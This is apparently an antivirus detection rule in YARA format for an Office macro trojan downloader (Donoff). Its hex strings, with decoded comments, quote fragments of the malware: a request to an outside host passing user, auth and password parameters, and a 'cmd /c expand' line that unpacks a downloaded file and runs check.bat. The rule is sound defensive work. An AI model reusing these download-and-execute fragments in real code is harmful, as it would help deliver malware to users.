
rule TrojanDownloader_O97M_Donoff_STR_MTB{
	meta:
		description = "TrojanDownloader:O97M/Donoff.STR!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {50 72 69 76 61 74 65 20 53 75 62 20 48 53 38 36 53 30 44 45 4a 28 29 } //01 00  Private Sub HS86S0DEJ()
		$a_01_1 = {6f 53 30 33 34 20 3d 20 69 41 45 33 30 44 20 26 20 22 5c 46 58 53 41 41 45 4e 50 49 4c 6f 67 46 69 6c 65 2e 74 78 74 22 } //01 00  oS034 = iAE30D & "\FXSAAENPILogFile.txt"
		$a_01_2 = {78 63 30 33 5a 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 3a 2f 2f 35 36 34 35 37 38 30 2e 63 31 2e 62 69 7a 2f 2f 69 6e 64 65 78 2e 70 68 70 3f 75 73 65 72 5f 69 64 3d 74 72 61 70 26 61 75 74 68 3d 74 72 61 70 26 70 77 3d 74 72 61 70 22 2c 20 46 61 6c 73 65 } //01 00  xc03Z.Open "GET", "http://5645780.c1.biz//index.php?user_id=trap&auth=trap&pw=trap", False
		$a_01_3 = {73 43 6d 64 4c 69 6e 65 20 3d 20 22 63 6d 64 20 2f 63 20 65 78 70 61 6e 64 20 22 20 26 20 6f 53 30 33 34 20 26 20 22 20 2d 46 3a 2a 20 22 20 26 20 69 41 45 33 30 44 20 26 20 22 20 26 26 20 22 20 26 20 69 41 45 33 30 44 20 26 20 22 5c 63 68 65 63 6b 2e 62 61 74 22 } //00 00  sCmdLine = "cmd /c expand " & oS034 & " -F:* " & iAE30D & " && " & iAE30D & "\check.bat"
	condition:
		any of ($a_*)
 
}